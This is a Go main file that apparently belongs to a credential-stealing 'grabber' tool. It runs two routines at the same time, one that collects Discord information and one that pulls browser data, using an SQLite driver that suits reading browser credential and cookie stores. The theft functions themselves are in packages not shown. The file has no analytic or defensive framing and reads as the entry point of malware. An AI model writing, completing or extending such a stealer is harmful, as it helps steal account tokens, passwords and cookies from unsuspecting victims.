package main

import (
	"fmt"
	"kdot/grabber/browsers"
	"kdot/grabber/discord"
	"os"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	startTime := time.Now()

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		discord.WriteDiscordInfo()
	}()

	// Start browsers.GetBrowserData in a goroutine
	go func() {
		defer wg.Done()
		browsers.GetBrowserData()
	}()

	wg.Wait()

	fmt.Println("Time elapsed: ", time.Since(startTime))
	os.Exit(0)
}
